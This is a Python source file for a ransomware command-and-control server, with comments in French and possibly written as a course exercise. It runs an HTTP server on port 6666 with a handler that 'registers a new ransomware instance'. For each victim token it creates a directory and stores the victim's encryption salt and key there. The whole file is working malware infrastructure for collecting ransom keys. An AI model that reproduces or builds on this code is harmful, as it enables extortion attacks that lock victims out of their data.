import base64
import hashlib
from http.server import HTTPServer
import os

from cncbase import CNCBase

class CNC(CNCBase):
    ROOT_PATH = "/root/CNC"

    def save_b64(self, token:str, data:str, filename:str):
        # helper
        # token and data are base64 field

        bin_data = base64.b64decode(data)
        path = os.path.join(CNC.ROOT_PATH, token, filename)
        with open(path, "wb") as f:
            f.write(bin_data)

    def post_new(self, path:str, params:dict, body:dict)->dict:
        # used to register new ransomware instance
        token = body["token"] # récupération du token
        self._log.info(f"TOKEN: {token}")
        salt = body["salt"] # récupération du sel
        key = body["key"] # récupération de la clé
        token_dec = hashlib.sha256(base64.b64decode(token)).hexdigest() # dechiffrement du token
        victim_dir = os.path.join(CNC.ROOT_PATH, token_dec) # création du chemin du dossier du victime
        os.makedirs(victim_dir, exist_ok=True) # création du dossier du victime

        # sauvegarde du sel et de la clé dans le dossier du victime
        with open(os.path.join(victim_dir, "salt"), "w") as salt_f:
            #salt_f.write(base64.b64decode(salt)) 
            salt_f.write(salt)
        with open(os.path.join(victim_dir, "key"), "w") as key_f:
            #key_f.write(base64.b64decode(key)) 
            key_f.write(key)
        
        # retourne un dictionnaire contenant le status de la requête (succès ou erreur)
        if os.path.isdir(victim_dir):
            return {"status":"Success"}
        else:
            return {"status":"Error"}
                   
        
httpd = HTTPServer(('0.0.0.0', 6666), CNC)
httpd.serve_forever()